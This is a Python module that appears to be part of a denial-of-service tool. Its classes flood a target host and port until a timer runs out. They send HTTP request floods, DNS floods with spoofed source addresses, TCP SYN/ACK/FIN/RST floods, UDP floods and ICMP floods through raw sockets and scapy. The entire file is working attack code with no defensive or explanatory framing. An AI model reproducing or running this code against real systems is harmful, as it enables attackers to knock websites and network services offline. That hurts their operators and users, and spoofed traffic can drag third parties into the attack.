import socket
import random
import string
from typing import Optional, Dict
from contextlib import suppress
from scapy.all import IP, TCP, UDP, ICMP, send
from scapy.layers.dns import DNS, DNSQR
from datetime import datetime, timedelta

from . import Endpoint, NetTools

#  Layer 7 (Application) 
class L7:
    def __init__(self, endpoint: Endpoint, duration: int = 30):
        self.endpoint: Endpoint = endpoint
        self.net_tools: NetTools = NetTools()
        # Time until attack stops
        self.until = datetime.now() + timedelta(seconds=duration)

    # Generate random payload for HTTP requests
    def _generate_payload(self, length: int = 256) -> str:
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    # Send a single TCP HTTP request repeatedly until duration ends
    def send_tcp_request(
        self,
        method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
        body: str = "",
        body_len: int = 256,
        spoofed_ip: str = None
    ) -> None:
        while (self.until - datetime.now()).total_seconds() > 0:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(10)
                if spoofed_ip:
                    s.bind((spoofed_ip, 0))
                s.connect((self.endpoint.host, self.endpoint.port))

                # Generate random body if needed
                body = self._generate_payload(body_len)
                req: bytes = self.net_tools.build_request(self.endpoint, method, body)

                # Add extra headers if provided
                if headers:
                    header_lines = "".join(f"{k}: {v}\r\n" for k, v in headers.items())
                    header_section = headers.encode() if isinstance(headers, bytes) else header_lines.encode()
                    req_parts = req.split(b"\r\n\r\n", 1)
                    if len(req_parts) == 2:
                        req = req_parts[0] + b"\r\n" + header_section + b"\r\n\r\n" + req_parts[1]
                    else:
                        req += header_section + b"\r\n\r\n"

                # Send request and receive response
                s.send(req)
                s.recv(4096)

    # HTTP methods mapped to send_tcp_request
    def GET(self, headers: Optional[Dict[str, str]] = None, body: str = "", body_len: int = 256, spoofed_ip: str = None) -> None:
        self.send_tcp_request("GET", headers, body, body_len, spoofed_ip)

    def POST(self, headers: Optional[Dict[str, str]] = None, body: str = "", body_len: int = 256, spoofed_ip: str = None) -> None:
        self.send_tcp_request("POST", headers, body, body_len, spoofed_ip)

    def HEAD(self, headers: Optional[Dict[str, str]] = None, spoofed_ip: str = None) -> None:
        self.send_tcp_request("HEAD", headers, spoofed_ip=spoofed_ip)

    def PUT(self, headers: Optional[Dict[str, str]] = None, body: str = "", body_len: int = 256, spoofed_ip: str = None) -> None:
        self.send_tcp_request("PUT", headers, body, body_len, spoofed_ip)

    def DELETE(self, headers: Optional[Dict[str, str]] = None, spoofed_ip: str = None) -> None:
        self.send_tcp_request("DELETE", headers, spoofed_ip=spoofed_ip)

    # DNS flood attack
    def DNS(self, spoofed_ip: str, domain: str = "google.com", qtype: str = "A") -> None:
        with suppress(Exception):
            while (self.until - datetime.now()).total_seconds() > 0:
                send(
                    IP(src=spoofed_ip, dst=self.endpoint.host) /
                    UDP(sport=random.randint(1024, 65535), dport=self.endpoint.port) /
                    DNS(rd=1, qd=DNSQR(qname=domain, qtype=qtype)),
                    verbose=0
                )

#  Layer 4 (Transport) 
class L4:
    def __init__(self, endpoint: Endpoint, duration: int):
        self.endpoint: Endpoint = endpoint
        self.until = datetime.now() + timedelta(seconds=duration)

    # Send a TCP packet with custom flags repeatedly
    def _send_tcp_flag(self, flags: str) -> None:
        with suppress(Exception):
            while (self.until - datetime.now()).total_seconds() > 0:
                send(
                    IP(dst=self.endpoint.host) /
                    TCP(
                        sport=random.randint(1024, 65535),
                        dport=self.endpoint.port,
                        flags=flags,
                        seq=random.randint(0, 0xFFFFFFFF)
                    ),
                    verbose=0
                )

    # TCP flag methods
    def ACK(self) -> None: self._send_tcp_flag('A')
    def SYN(self) -> None: self._send_tcp_flag('S')
    def FIN(self) -> None: self._send_tcp_flag('F')
    def RST(self) -> None: self._send_tcp_flag('R')
    def TCP(self) -> None: self._send_tcp_flag(None)

    # UDP flood
    def UDP(self, message: bytes = b"hello") -> None:
        with suppress(Exception):
            while (self.until - datetime.now()).total_seconds() > 0:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    s.sendto(message, (self.endpoint.host, self.endpoint.port))

#  Layer 3 (Network) 
class L3:
    def __init__(self, endpoint: Endpoint, duration: int):
        self.endpoint: Endpoint = endpoint
        self.until = datetime.now() + timedelta(seconds=duration)

    # ICMP ping/flood
    def ICMP(self, payload: bytes = b"payload") -> None:
        with suppress(Exception):
            while (self.until - datetime.now()).total_seconds() > 0:
                send(
                    IP(dst=self.endpoint.host) /
                    ICMP() /
                    payload,
                    verbose=0
                )
